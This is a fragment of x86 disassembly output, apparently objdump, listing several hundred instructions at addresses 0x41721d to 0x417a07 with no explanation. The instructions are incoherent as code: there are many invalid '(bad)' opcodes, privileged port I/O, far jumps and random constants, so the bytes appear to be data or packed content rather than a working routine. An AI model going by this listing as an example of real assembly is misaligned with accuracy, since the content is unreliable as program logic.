  41721d:	xor    dh,dh
  41721f:	cwde   
  417220:	ds jecxz 0x417225
  417223:	xor    esp,DWORD PTR [edi+0x19a24013]
  417229:	or     BYTE PTR [edi-0xe1e2fb8],ch
  41722f:	mov    ds:0x9e95b703,al
  417234:	inc    ecx
  417235:	and    BYTE PTR [edi-0x76],bh
  417238:	xchg   ebp,eax
  417239:	cmp    eax,0x91a7ee70
  41723e:	add    ch,BYTE PTR [edi]
  417240:	loope  0x417213
  417242:	push   0xffffffdd
  417244:	pop    eax
  417245:	les    ebp,FWORD PTR [edx+0x23cd7682]
  41724b:	or     bh,BYTE PTR [edi]
  41724d:	xchg   edi,eax
  41724e:	sbb    edi,DWORD PTR [ecx+0x53ea4ff]
  417254:	inc    edi
  417255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417256:	dec    eax
  417257:	push   0xd40d5479
  41725c:	sar    DWORD PTR [eax+0x50],1
  41725f:	jp     0x41720e
  417261:	fs mov dh,0xd6
  417264:	ret    
  417265:	in     eax,0xce
  417267:	jne    0x417240
  417269:	pushf  
  41726a:	push   edi
  41726b:	or     cl,BYTE PTR [eax+0x6c]
  41726e:	jl     0x4172bc
  417270:	add    eax,DWORD PTR [ecx+0x69e48218]
  417276:	inc    ebx
  417277:	push   ds
  417278:	test   DWORD PTR [edx-0x77],ebp
  41727b:	inc    edx
  41727c:	ret    0x821c
  41727f:	xchg   ebx,eax
  417280:	arpl   WORD PTR [ebx+0x4eeffe48],ax
  417286:	xchg   ecx,eax
  417287:	pop    edi
  417288:	addr16 mov ebp,0x128560b2
  41728e:	aad    0x9b
  417290:	sbb    BYTE PTR [eax+ebp*8],bh
  417293:	fwait
  417294:	or     al,0xd2
  417296:	ja     0x417282
  417298:	fldenv [eax]
  41729a:	arpl   WORD PTR [edi+edx*8+0x607d1b7b],dx
  4172a1:	sbb    esi,DWORD PTR [edx]
  4172a3:	mov    ch,0xcb
  4172a5:	add    BYTE PTR [ecx-0x4d],dl
  4172a8:	xor    al,0xc0
  4172aa:	in     al,dx
  4172ab:	sub    ebx,DWORD PTR [edi+0x5effb94f]
  4172b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b2:	jo     0x4172f7
  4172b4:	test   BYTE PTR [edx-0x1ae39304],0x60
  4172bb:	push   eax
  4172bc:	js     0x417330
  4172be:	sbb    DWORD PTR [edi-0x20890113],ebp
  4172c4:	mov    cl,0xf0
  4172c6:	or     ebp,0xffffffda
  4172c9:	das    
  4172ca:	rcl    DWORD PTR [eax+edx*1+0x63a77d42],cl
  4172d1:	jg     0x4172cc
  4172d3:	inc    esi
  4172d4:	adc    BYTE PTR [ecx-0x5cfb01dc],bl
  4172da:	mov    esi,0xebd85f7f
  4172df:	mov    dl,0xb5
  4172e1:	leave  
  4172e2:	daa    
  4172e3:	sar    dl,0xf1
  4172e6:	(bad)  
  4172e7:	xor    esp,DWORD PTR ds:0x6c8d3af2
  4172ed:	lods   al,BYTE PTR ds:[esi]
  4172ee:	in     al,dx
  4172ef:	shr    DWORD PTR [esp+esi*4],0x58
  4172f3:	jmp    0x417369
  4172f5:	int    0x74
  4172f7:	sub    BYTE PTR [eax-0x4c72ef14],cl
  4172fd:	xchg   cl,bl
  4172ff:	sbb    bh,BYTE PTR [edx]
  417301:	fmul   DWORD PTR ds:0x73f3ed47
  417307:	mov    eax,ds:0x32d1a09b
  41730c:	out    dx,eax
  41730d:	sbb    BYTE PTR [ecx-0x46],dl
  417310:	icebp  
  417311:	mov    bh,0xd9
  417313:	xlat   BYTE PTR ds:[ebx]
  417314:	lods   al,BYTE PTR ds:[esi]
  417315:	xor    ebp,DWORD PTR [esi-0x2ada7bf2]
  41731b:	xchg   esi,eax
  41731c:	xor    esp,0xffffffb6
  41731f:	push   DWORD PTR ds:[ebx]
  417322:	cli    
  417323:	div    DWORD PTR [edi+0x45]
  417326:	lea    eax,ds:0xc3480f7b
  41732c:	xor    al,0xd8
  41732e:	xlat   BYTE PTR ds:[ebx]
  41732f:	stc    
  417330:	and    ebp,DWORD PTR [esi+0x61]
  417333:	or     esp,ebx
  417335:	xchg   edi,eax
  417336:	jo     0x417318
  417338:	xor    ah,BYTE PTR [ecx+0x3c428c09]
  41733e:	setns  BYTE PTR [eax]
  417341:	pop    edi
  417342:	outs   dx,BYTE PTR ds:[esi]
  417343:	iret   
  417344:	out    0x20,al
  417346:	mov    dh,0x19
  417348:	ins    BYTE PTR es:[edi],dx
  417349:	mov    dl,BYTE PTR [esi]
  41734b:	pop    edx
  41734c:	mov    DWORD PTR [eax+0x638abe1e],0xc9654bc4
  417356:	inc    edx
  417357:	pop    ebp
  417358:	jns    0x417342
  41735a:	xlat   BYTE PTR ds:[ebx]
  41735b:	sub    BYTE PTR [edx],bh
  41735d:	ss xchg ebx,eax
  41735f:	inc    ebp
  417360:	inc    esp
  417361:	div    BYTE PTR [ebx-0x1c]
  417364:	ins    DWORD PTR es:[edi],dx
  417365:	gs dec edx
  417367:	mov    edi,0x7e0dce3a
  41736c:	outs   dx,BYTE PTR ds:[esi]
  41736d:	sbb    eax,0x6fff3899
  417372:	mov    cl,BYTE PTR [ecx+eiz*4-0x1db2abfc]
  417379:	or     eax,0xc47353df
  41737e:	add    BYTE PTR [edx],dh
  417380:	xor    eax,edx
  417382:	or     BYTE PTR [eax],ch
  417384:	cwde   
  417385:	xchg   ebp,eax
  417386:	(bad)  
  417387:	loopne 0x41730e
  417389:	imul   ecx,DWORD PTR [eax+0x5e49e7e4],0xc463a79b
  417393:	or     dl,BYTE PTR [ecx]
  417395:	push   esi
  417396:	xor    DWORD PTR [ebp+eiz*1-0x2],ebx
  41739a:	mov    edi,0x369245a2
  41739f:	das    
  4173a0:	dec    eax
  4173a1:	mul    bl
  4173a3:	mov    DWORD PTR [ebx+0x7a3d38d7],edx
  4173a9:	mov    WORD PTR [ebp-0x43fc6bdc],gs
  4173af:	icebp  
  4173b0:	imul   edi,DWORD PTR [bp+si-0xb],0xa1687083
  4173b8:	out    dx,eax
  4173b9:	dec    ebp
  4173ba:	sbb    al,0x6b
  4173bc:	retf   
  4173bd:	mov    eax,ds:0x6ff81544
  4173c2:	and    ch,cl
  4173c4:	pop    edx
  4173c5:	xchg   edx,eax
  4173c6:	cmp    DWORD PTR [edi],0xffffffce
  4173c9:	lea    ebx,[esi]
  4173cb:	inc    esi
  4173cc:	jns    0x417378
  4173ce:	fdiv   QWORD PTR [esi]
  4173d0:	mov    eax,0x4725c1d6
  4173d5:	pop    edi
  4173d6:	xchg   ecx,eax
  4173d7:	and    ch,BYTE PTR [esi-0x55145862]
  4173dd:	mov    al,0x52
  4173df:	imul   cx,WORD PTR ds:0xf568a190,0x11
  4173e7:	push   ecx
  4173e8:	(bad)  [esi]
  4173ea:	pop    eax
  4173eb:	jmp    0x4d8b:0xd8885e7f
  4173f2:	hlt    
  4173f3:	push   cs
  4173f4:	fdiv   QWORD PTR [ebp-0x33]
  4173f7:	cmp    al,BYTE PTR [ecx+0x4d361695]
  4173fd:	inc    ebx
  4173fe:	xchg   esi,eax
  4173ff:	mov    esi,0xd528916f
  417404:	push   esp
  417405:	mov    ?,WORD PTR [ebp*4-0x629bd18d]
  41740c:	shr    edx,cl
  41740e:	dec    edi
  41740f:	fldenv [edx-0x7a3e4919]
  417415:	fisub  DWORD PTR [esi+0x74]
  417418:	xor    BYTE PTR [ebx-0x647f3d1e],bl
  41741e:	js     0x4173cf
  417420:	jo     0x417465
  417422:	mov    esp,0xb2af02fd
  417427:	inc    esi
  417428:	xchg   edi,eax
  417429:	lock test DWORD PTR [ebx-0x52],esi
  41742d:	jge    0x417477
  41742f:	and    al,0xe0
  417431:	adc    bl,BYTE PTR [edx]
  417433:	dec    eax
  417434:	dec    edi
  417435:	xchg   DWORD PTR [ebx],ebp
  417437:	xor    al,0x6
  417439:	(bad)
  41743d:	mov    edx,0x51398c98
  417442:	int    0x5a
  417444:	push   ebp
  417445:	stos   DWORD PTR es:[edi],eax
  417446:	into   
  417447:	jle    0x41748b
  417449:	in     eax,dx
  41744a:	cmp    bh,BYTE PTR [eax]
  41744c:	xchg   edi,eax
  41744d:	pop    ecx
  41744e:	adc    al,0xfd
  417450:	sub    DWORD PTR [eax],eax
  417452:	and    al,0xb5
  417454:	call   FWORD PTR [eax]
  417456:	loop   0x4173ed
  417458:	addr16 sar cl,0xd2
  41745c:	dec    ecx
  41745d:	nop
  41745e:	mov    al,0xd1
  417460:	jnp    0x41743e
  417462:	xor    al,BYTE PTR [ebx+0x32ae6d41]
  417468:	fisubr WORD PTR [ebp-0x50]
  41746b:	pop    ebx
  41746c:	jg     0x417474
  41746e:	inc    edx
  41746f:	push   cs
  417470:	test   ch,al
  417472:	cmp    esp,DWORD PTR es:[edi+0x388d313]
  417479:	std    
  41747a:	cmp    BYTE PTR [ebp-0x46],bl
  41747d:	xor    DWORD PTR [edi-0x5034ca17],0x7774733a
  417487:	jle    0x417444
  417489:	cdq    
  41748a:	xrelease mov BYTE PTR [esi+0x3376be57],0x79
  417492:	shr    DWORD PTR [eax+eax*2+0x7d],1
  417496:	ret    0x6dc8
  417499:	call   0x34fc5f1b
  41749e:	nop
  41749f:	outs   dx,DWORD PTR ds:[esi]
  4174a0:	test   DWORD PTR [ebx+0x13],ebx
  4174a3:	ins    BYTE PTR es:[edi],dx
  4174a4:	adc    edi,edx
  4174a6:	xchg   ebp,eax
  4174a7:	xlat   BYTE PTR ds:[ebx]
  4174a8:	dec    ecx
  4174a9:	inc    edx
  4174aa:	fisttp WORD PTR [edi+0x13]
  4174ad:	or     eax,0x9b621cf1
  4174b2:	dec    edi
  4174b3:	je     0x41745b
  4174b5:	cmp    ah,BYTE PTR [ebp-0x6e]
  4174b8:	out    0x13,eax
  4174ba:	jbe    0x417505
  4174bc:	xchg   esp,eax
  4174bd:	push   esp
  4174be:	data16 jno 0x417538
  4174c1:	push   esi
  4174c2:	int    0xb6
  4174c4:	sar    edi,0x57
  4174c7:	lahf   
  4174c8:	loope  0x417468
  4174ca:	les    ecx,FWORD PTR [ecx-0xa863ae]
  4174d0:	or     dh,BYTE PTR [edi]
  4174d2:	xchg   edx,eax
  4174d3:	jg     0x417544
  4174d5:	mov    ch,0xbf
  4174d7:	div    BYTE PTR [esi]
  4174d9:	jge    0x4174b2
  4174db:	cmp    esi,edi
  4174dd:	fadd   QWORD PTR [edi-0x5d]
  4174e0:	out    0xe4,al
  4174e2:	push   cs
  4174e3:	push   esi
  4174e4:	mov    ch,0xc1
  4174e6:	test   al,0xc8
  4174e8:	cwde   
  4174e9:	xchg   ebp,eax
  4174ea:	dec    ecx
  4174eb:	cmp    bl,ah
  4174ed:	jb     0x417506
  4174ef:	sub    eax,0x6cf2cfb9
  4174f4:	(bad)  
  4174f6:	push   ebx
  4174f7:	sub    DWORD PTR [eax-0x5b],esp
  4174fa:	mov    ?,WORD PTR [eax+0x2badbe1]
  417500:	sub    bh,BYTE PTR [edi+0x6903f48e]
  417506:	mov    esi,0xea1e022a
  41750b:	mov    ebp,0xdd821084
  417510:	imul   esi,DWORD PTR [edi-0x6c],0xfffffff3
  417514:	data16 add dh,BYTE PTR [edi]
  417517:	mov    cl,0x78
  417519:	xor    DWORD PTR [ebx+0x4c93cd2a],edi
  41751f:	pop    ecx
  417520:	imul   ecx,DWORD PTR [edx],0x42
  417523:	sub    edx,DWORD PTR [ebp-0xed8ea22]
  417529:	test   al,0x98
  41752b:	add    ch,BYTE PTR [eax+0x1790f415]
  417531:	and    bl,dh
  417533:	imul   ebx,DWORD PTR [eax-0x5a8413b7],0xffffffc8
  41753a:	add    dh,BYTE PTR [eax-0x31]
  41753d:	push   eax
  41753e:	pop    edi
  41753f:	mov    cl,0x87
  417541:	sbb    DWORD PTR [ebp+0x1800de37],0x11
  417548:	pushf  
  417549:	lea    ecx,[esi-0x51bec420]
  41754f:	mov    al,0xf1
  417551:	fsub   QWORD PTR [edx]
  417553:	mov    ds:0x626cb3fa,al
  417558:	add    ah,BYTE PTR [eax+0x1705979b]
  41755e:	mov    BYTE PTR [edi-0x36],bl
  417561:	iret   
  417562:	ins    DWORD PTR es:[edi],dx
  417563:	iret   
  417564:	cs sbb eax,edi
  417567:	jae    0x417509
  417569:	dec    edx
  41756a:	sub    ah,dh
  41756c:	mov    esp,0xead0c873
  417571:	mov    eax,ds:0x8ef055b3
  417576:	aaa    
  417577:	pusha  
  417578:	mov    es,eax
  41757a:	inc    ebx
  41757b:	add    al,0x6
  41757d:	out    0xaf,al
  41757f:	ds sahf 
  417581:	out    0xf0,al
  417583:	mov    ebx,0x5b53c3cc
  417588:	scas   al,BYTE PTR es:[edi]
  417589:	je     0x41757f
  41758b:	es and ebp,0x11
  41758f:	lock jp 0x417529
  417592:	pop    esp
  417593:	loope  0x417517
  417595:	mov    ch,BYTE PTR [esi-0x3d]
  417598:	dec    ebp
  417599:	xlat   BYTE PTR ds:[ebx]
  41759a:	xchg   esi,eax
  41759b:	push   0x5
  41759d:	mov    dl,BYTE PTR [ebp-0xa]
  4175a0:	sbb    DWORD PTR [ebp+0x78],esp
  4175a3:	popa   
  4175a4:	push   cs
  4175a5:	(bad)  
  4175a7:	sub    BYTE PTR [ebp-0x50],bl
  4175aa:	and    bh,BYTE PTR [ecx+0x6a]
  4175ad:	scas   al,BYTE PTR es:[edi]
  4175ae:	int3   
  4175af:	push   0x97b0e68b
  4175b4:	fdivr  QWORD PTR [ecx]
  4175b6:	push   ds
  4175b7:	dec    edx
  4175b8:	pop    esi
  4175b9:	and    ah,BYTE PTR [esi]
  4175bb:	cmp    DWORD PTR [eax],0xd0ae11a3
  4175c1:	pop    esp
  4175c2:	cmp    al,0xd7
  4175c4:	push   esp
  4175c5:	pusha  
  4175c6:	xor    ecx,ebp
  4175c8:	mov    al,0x80
  4175ca:	fwait
  4175cb:	and    esp,edx
  4175cd:	inc    ebx
  4175ce:	push   edx
  4175cf:	mov    ebp,DWORD PTR [eax]
  4175d1:	scas   al,BYTE PTR es:[edi]
  4175d2:	push   esi
  4175d3:	in     eax,0x3f
  4175d5:	jno    0x417561
  4175d7:	and    BYTE PTR [edx-0x46],cl
  4175da:	adc    eax,0xbc5f64c3
  4175df:	pminsw mm5,mm6
  4175e2:	push   edi
  4175e3:	cmp    cl,dl
  4175e5:	fnstcw WORD PTR [ebx+0x4cd10ad8]
  4175eb:	push   edi
  4175ec:	inc    ebx
  4175ed:	sub    DWORD PTR [ebx+0x75],eax
  4175f0:	sbb    bh,BYTE PTR [edi-0x5616e362]
  4175f6:	fidiv  WORD PTR [edi+0x63]
  4175f9:	je     0x4175b7
  4175fb:	popf   
  4175fc:	fwait
  4175fd:	lea    edx,[edx+0x17]
  417600:	cmc    
  417601:	and    bl,BYTE PTR [esi]
  417603:	push   edi
  417604:	lahf   
  417605:	shld   edi,ecx,cl
  417608:	aad    0x87
  41760a:	adc    dl,BYTE PTR [eax]
  41760c:	cmp    eax,0xc6d03c32
  417611:	pop    ecx
  417612:	jge    0x4175b9
  417614:	into   
  417615:	fldenv [esi+ebx*8+0x60]
  417619:	jl     0x4175e0
  41761b:	pop    esi
  41761c:	or     BYTE PTR ds:0x4677e8d2,bl
  417622:	addr16 test eax,0x3e9fc6af
  417628:	lods   al,BYTE PTR ds:[esi]
  417629:	xlat   BYTE PTR ds:[ebx]
  41762a:	cli    
  41762b:	and    DWORD PTR [ebp-0x38d74508],edi
  417631:	jae    0x4175c3
  417633:	out    0x5d,al
  417635:	cmp    al,0x61
  417637:	push   ds
  417638:	jno    0x417660
  41763a:	jge    0x417644
  41763c:	inc    ebp
  41763d:	(bad)  
  41763f:	pop    esp
  417640:	adc    eax,0x4741cf9e
  417645:	rol    BYTE PTR [edx-0x375190d9],0x88
  41764c:	stos   DWORD PTR es:[edi],eax
  41764d:	test   ecx,ebx
  41764f:	xor    cl,al
  417651:	mov    BYTE PTR [edi+edi*8-0x24],ch
  417655:	rcr    BYTE PTR [edi],0xb5
  417658:	js     0x4175f2
  41765a:	mov    edi,0xe66191a0
  41765f:	jmp    0xf674:0x97a9d7d8
  417666:	ins    DWORD PTR es:[edi],dx
  417667:	dec    ecx
  417668:	adc    esi,eax
  41766a:	popa   
  41766b:	mov    esi,0xb10fb675
  417670:	or     eax,0x54166bf2
  417675:	jl     0x417631
  417677:	dec    ebx
  417678:	aas    
  417679:	dec    edx
  41767a:	push   ds
  41767b:	inc    edi
  41767c:	(bad)  
  41767d:	das    
  41767e:	popf   
  41767f:	aam    0x81
  417681:	adc    eax,DWORD PTR [edi]
  417683:	hlt    
  417684:	stos   DWORD PTR es:[edi],eax
  417685:	adc    esi,DWORD PTR [esi-0x42]
  417688:	jmp    0x4176da
  41768a:	es imul esi,edi,0xff3630e8
  417691:	out    dx,al
  417692:	xor    edi,ebp
  417694:	mul    BYTE PTR [edx]
  417696:	mov    DWORD PTR [esi+0x51],edi
  417699:	call   0x3392e929
  41769e:	sbb    ebp,DWORD PTR [eax-0x4]
  4176a1:	mov    ch,BYTE PTR ds:0x4e546bd7
  4176a7:	scas   al,BYTE PTR es:[edi]
  4176a8:	ret    0x28ef
  4176ab:	sub    eax,0x4c6a2089
  4176b0:	(bad)  
  4176b1:	js     0x41770c
  4176b3:	and    ch,BYTE PTR [edx+0x1a]
  4176b6:	mov    es,WORD PTR [edx-0x54764f7d]
  4176bc:	int    0x8c
  4176be:	and    al,0x16
  4176c0:	scas   al,BYTE PTR es:[edi]
  4176c1:	mov    edx,0x7cb8a169
  4176c6:	aad    0x28
  4176c8:	pop    edi
  4176c9:	mov    al,0xea
  4176cb:	lods   al,BYTE PTR ds:[esi]
  4176cc:	sub    BYTE PTR [eax],0xb6
  4176cf:	fidivr DWORD PTR [edx]
  4176d1:	mov    dh,BYTE PTR [ebp-0x39]
  4176d4:	loope  0x417710
  4176d6:	jns    0x417740
  4176d8:	pop    eax
  4176d9:	mov    esi,0x39bdc332
  4176de:	sbb    eax,0xaa3b560a
  4176e3:	add    dh,BYTE PTR ds:0x56a02d4b
  4176e9:	jl     0x417680
  4176eb:	dec    eax
  4176ec:	mov    DWORD PTR [esi],ebx
  4176ee:	push   ebp
  4176ef:	lods   eax,DWORD PTR ds:[esi]
  4176f0:	adc    DWORD PTR [esi],edx
  4176f2:	and    DWORD PTR [esi-0x14],edi
  4176f5:	pop    ds
  4176f6:	fwait
  4176f7:	popf   
  4176f8:	mov    bl,0x4a
  4176fa:	push   0xffffffd9
  4176fc:	retf   0x40a8
  4176ff:	push   esp
  417700:	popa   
  417701:	xchg   edx,eax
  417702:	add    bh,BYTE PTR [ebx]
  417704:	sbb    DWORD PTR [eax+ebp*2-0x6d6b371d],esp
  41770b:	sub    BYTE PTR ds:0x20e31fc5,cl
  417711:	mov    eax,ds:0xe5f732bb
  417716:	jle    0x417791
  417718:	xchg   ecx,eax
  417719:	aad    0xb6
  41771b:	push   ebx
  41771c:	test   eax,0xeb562567
  417721:	out    dx,al
  417722:	fs push 0x64555526
  417728:	es imul ebx
  41772b:	push   ebx
  41772c:	mov    edi,eax
  41772e:	std    
  41772f:	repz mov ds:0x32b33ff6,al
  417735:	mov    cl,0x87
  417737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417738:	enter  0xc3c2,0xa1
  41773c:	and    DWORD PTR [eax],eax
  41773e:	pop    eax
  41773f:	(bad)  
  417740:	scas   al,BYTE PTR es:[edi]
  417741:	pusha  
  417742:	add    DWORD PTR [esi+esi*1],edx
  417745:	cmp    DWORD PTR ds:0x75da72e,0x32
  41774c:	push   0xf13055a
  417751:	pushf  
  417752:	(bad)  
  417753:	cwde   
  417754:	push   edi
  417755:	push   es
  417756:	inc    ebp
  417757:	or     eax,DWORD PTR [esi+0x3be43c02]
  41775d:	dec    BYTE PTR [edx+0x21]
  417760:	out    dx,eax
  417761:	pushf  
  417762:	xor    ecx,esi
  417764:	imul   eax,DWORD PTR [edi-0x1d],0xdd7746a5
  41776b:	out    0x1b,al
  41776d:	call   0xf616:0x4d931ea6
  417774:	js     0x417719
  417776:	xor    BYTE PTR fs:[eax+eiz*4-0x615b18ca],ch
  41777e:	mov    esi,0xcc532220
  417783:	out    0xc4,al
  417785:	and    bl,cl
  417787:	shl    edx,cl
  417789:	dec    ecx
  41778a:	mov    ebx,edi
  41778c:	fld    QWORD PTR [edi+ebx*1]
  41778f:	jg     0x4177a9
  417791:	dec    esi
  417792:	pop    edi
  417793:	xlat   BYTE PTR ds:[ebx]
  417794:	jecxz  0x41776f
  417796:	inc    ebp
  417797:	inc    eax
  417798:	adc    BYTE PTR [edi+0x6c],ah
  41779b:	and    al,0xee
  41779d:	rcr    DWORD PTR ds:0x295dcb44,0x5e
  4177a4:	xor    DWORD PTR [edi+0x45],esi
  4177a7:	sti    
  4177a8:	inc    edi
  4177a9:	mov    edi,0x8d2a4d
  4177ae:	mov    cl,BYTE PTR [ebx-0x8]
  4177b1:	mov    eax,0x2619891e
  4177b6:	out    dx,al
  4177b7:	jbe    0x4177ac
  4177b9:	or     eax,0xbb9ecddf
  4177be:	cli    
  4177bf:	and    ecx,DWORD PTR [ebx-0x3]
  4177c2:	dec    ecx
  4177c3:	das    
  4177c4:	pusha  
  4177c5:	stos   DWORD PTR es:[edi],eax
  4177c6:	aam    0x27
  4177c8:	aad    0xb2
  4177ca:	pop    esi
  4177cb:	adc    eax,esi
  4177cd:	gs call 0x6218fe44
  4177d3:	daa    
  4177d4:	hlt    
  4177d5:	mov    esp,0xc6fec470
  4177da:	mov    ds:0x993e844f,eax
  4177df:	push   eax
  4177e0:	inc    ecx
  4177e1:	push   esi
  4177e2:	jp     0x41778b
  4177e4:	lods   al,BYTE PTR ds:[esi]
  4177e5:	jg     0x417838
  4177e7:	and    BYTE PTR [ebp+0x71],bl
  4177ea:	repz iret 
  4177ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177ed:	dec    edx
  4177ee:	mov    esi,0x887873e4
  4177f3:	pop    eax
  4177f4:	imul   ecx,DWORD PTR [ecx],0x6e67e991
  4177fa:	sub    BYTE PTR [ebx+0x349fb40e],bh
  417800:	out    0xa6,eax
  417802:	sbb    dh,BYTE PTR [edx+0x307c8802]
  417808:	fdivr  st(5),st
  41780a:	shl    BYTE PTR [ebx],0x63
  41780d:	and    eax,0xa3abfd99
  417812:	or     al,0x84
  417814:	test   BYTE PTR [ecx+0x2d],0x4a
  417818:	ret    0xabc0
  41781b:	fidivr DWORD PTR [ecx]
  41781d:	push   0x11693cc9
  417822:	jnp    0x417886
  417824:	rcl    DWORD PTR [edi-0x18],0xeb
  417828:	lods   eax,DWORD PTR ds:[esi]
  417829:	mov    esi,0x29ac3b1e
  41782e:	fcmovnbe st,st(0)
  417830:	in     eax,0x2d
  417832:	mov    bl,0x76
  417834:	sti    
  417835:	scas   eax,DWORD PTR es:[edi]
  417836:	sbb    esp,eax
  417838:	out    dx,eax
  417839:	jbe    0x417894
  41783b:	into   
  41783c:	push   edi
  41783d:	xor    bl,0x2b
  417840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417841:	pusha  
  417842:	add    bl,BYTE PTR [ebx]
  417844:	mov    al,ds:0xfeb3fafb
  417849:	jmp    0x322a33f2
  41784e:	scas   al,BYTE PTR es:[edi]
  41784f:	sti    
  417850:	and    eax,0x226cd2f8
  417855:	cli    
  417856:	out    dx,al
  417857:	cdq    
  417858:	gs push 0xffffff9a
  41785b:	jns    0x417892
  41785d:	mov    ch,0x10
  41785f:	fwait
  417860:	xor    al,0x55
  417862:	les    edi,FWORD PTR [ebx]
  417864:	fst    DWORD PTR [edx-0x1845aa4e]
  41786a:	inc    ebp
  41786b:	sbb    BYTE PTR [ebx-0x29e24c9f],0x86
  417872:	idiv   DWORD PTR ds:0x5d316176
  417878:	enter  0xe73c,0x22
  41787c:	and    DWORD PTR [esi-0x70],edx
  41787f:	mov    bl,0xe8
  417881:	test   eax,0x2c23d206
  417886:	pop    eax
  417887:	lock mov cs,WORD PTR [ebp+0x1e]
  41788b:	mov    esp,0xb45f65e2
  417890:	stos   BYTE PTR es:[di],al
  417892:	mov    esp,0x18cea4fd
  417897:	lods   al,BYTE PTR ds:[esi]
  417898:	mov    ah,BYTE PTR [edi-0x6ce31105]
  41789e:	inc    esp
  41789f:	or     eax,0x69fa01a5
  4178a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a5:	cmp    eax,0xaf05438d
  4178aa:	pusha  
  4178ab:	pop    ebx
  4178ac:	sub    BYTE PTR [edi],bh
  4178ae:	and    eax,0xc9b419b3
  4178b3:	push   esi
  4178b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178b5:	push   esp
  4178b6:	call   0x5f8f58ce
  4178bb:	leave  
  4178bc:	sti    
  4178bd:	adc    DWORD PTR [esi-0x7f],edx
  4178c0:	xlat   BYTE PTR ds:[ebx]
  4178c1:	cmp    bh,BYTE PTR [ecx+0xf]
  4178c4:	fs inc eax
  4178c6:	fistp  DWORD PTR [edx+0x615b373a]
  4178cc:	in     eax,0x7a
  4178ce:	push   0x5b8e894e
  4178d3:	xchg   DWORD PTR [edx+eax*1-0x64],ebx
  4178d7:	cmp    DWORD PTR [esi],edx
  4178d9:	or     al,0x25
  4178db:	push   ss
  4178dc:	sbb    DWORD PTR [ecx+ebp*1+0x63665ef0],0x9f5b2151
  4178e7:	and    al,0xe1
  4178e9:	sub    BYTE PTR ds:0x4a930b6a,dl
  4178ef:	lods   al,BYTE PTR ds:[esi]
  4178f0:	dec    edx
  4178f1:	mov    al,0xdb
  4178f3:	sahf   
  4178f4:	add    al,0x60
  4178f6:	mov    ch,0x58
  4178f8:	dec    DWORD PTR [edx+0x7f]
  4178fb:	(bad)  
  4178fd:	push   0xffffffd0
  4178ff:	iret   
  417900:	clc    
  417901:	test   DWORD PTR [edx-0x2c8c218b],ecx
  417907:	cwde   
  417908:	mov    edi,0x97204c2d
  41790d:	mov    ds,WORD PTR [ebx]
  41790f:	and    bh,BYTE PTR [ebx]
  417911:	cmp    BYTE PTR [ecx+0x6c],dh
  417914:	pop    es
  417915:	mov    esp,0xae3599f0
  41791a:	test   BYTE PTR [ecx-0x625df8b9],dl
  417920:	mov    ebp,0x82cff57f
  417925:	test   DWORD PTR [ebx+0x59cbefd7],esp
  41792b:	retf   
  41792c:	inc    esi
  41792d:	(bad)  
  41792e:	mov    edi,0xec3e2326
  417933:	jmp    0x4178e6
  417935:	nop
  417936:	hlt    
  417937:	fsubr  QWORD PTR [edx-0x11551efc]
  41793d:	jnp    0x4178f8
  41793f:	sbb    al,0xb3
  417942:	aam    0x28
  417944:	xor    dh,BYTE PTR [ebx]
  417946:	rcr    BYTE PTR [esi-0x22],1
  417949:	push   0x1b889419
  41794e:	(bad)  
  41794f:	repz pop DWORD PTR [esi+0x2b4f5cc7]
  417956:	(bad)  
  417957:	fdiv   QWORD PTR [edi-0x5a]
  41795a:	imul   eax,ecx,0x58
  41795d:	xor    bh,ah
  41795f:	sub    eax,0x5296a05d
  417964:	add    eax,0xf91456c2
  417969:	or     BYTE PTR [ebx-0x8],cl
  41796c:	scas   al,BYTE PTR es:[edi]
  41796d:	xor    ebp,0xffffffed
  417970:	mov    eax,0x666b5ebd
  417975:	xchg   DWORD PTR [ecx+0x4d],ebp
  417978:	jne    0x417948
  41797a:	out    dx,eax
  41797b:	out    dx,al
  41797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41797d:	jle    0x4179e0
  41797f:	jnp    0x41796d
  417981:	pop    esi
  417982:	sbb    al,BYTE PTR [ebx]
  417984:	pop    es
  417985:	das    
  417986:	sub    DWORD PTR [edi-0x1],edx
  417989:	mov    eax,0x1fcb8f6c
  41798e:	enter  0xcbe8,0x5
  417992:	jbe    0x417951
  417994:	es stos DWORD PTR es:[edi],eax
  417996:	xchg   BYTE PTR [edx+edi*8-0x77],bl
  41799a:	or     al,BYTE PTR [edx]
  41799c:	mov    edi,0x6abd32ce
  4179a1:	mov    al,ds:0x539f107d
  4179a6:	jbe    0x4179c5
  4179a8:	out    dx,eax
  4179a9:	jl     0x417968
  4179ab:	retf   
  4179ac:	mov    edi,0xd92eafa7
  4179b1:	cmp    bh,dh
  4179b3:	lods   eax,DWORD PTR ds:[esi]
  4179b4:	(bad)  
  4179b6:	xor    al,0x1f
  4179b8:	jecxz  0x41797e
  4179ba:	stos   DWORD PTR es:[edi],eax
  4179bb:	test   bh,al
  4179bd:	gs int3 
  4179bf:	dec    edx
  4179c0:	(bad)  
  4179c1:	mov    esp,0x16617fd2
  4179c6:	imul   esp,DWORD PTR [eax+0x42],0x2ff3353b
  4179cd:	aad    0xbc
  4179cf:	xor    ch,cl
  4179d1:	psrlw  mm5,QWORD PTR [eax+0x3c]
  4179d5:	aam    0x51
  4179d7:	clc    
  4179d8:	push   edx
  4179d9:	xor    dh,BYTE PTR [eax+edi*1-0x7b]
  4179dd:	sbb    eax,0xef40c245
  4179e2:	push   cs
  4179e3:	jbe    0x4179f8
  4179e5:	pop    esi
  4179e6:	in     eax,0x51
  4179e8:	adc    dh,BYTE PTR [ebx+0x4a]
  4179eb:	les    eax,FWORD PTR [ebp+0x6b]
  4179ee:	xor    al,0x43
  4179f0:	ja     0x4179ba
  4179f2:	iret   
  4179f3:	mov    esi,0xc4375697
  4179f8:	xchg   esi,eax
  4179f9:	cwd    
  4179fb:	cmp    DWORD PTR [ecx+ebp*8-0x26],ebp
  4179ff:	pop    ebp
  417a00:	ds aas 
  417a02:	lods   eax,DWORD PTR ds:[esi]
  417a03:	cld    
  417a04:	sti    
  417a05:	push   eax
  417a06:	push   ds
  417a07:	shr    BYTE PTR [edx-0x7c],1
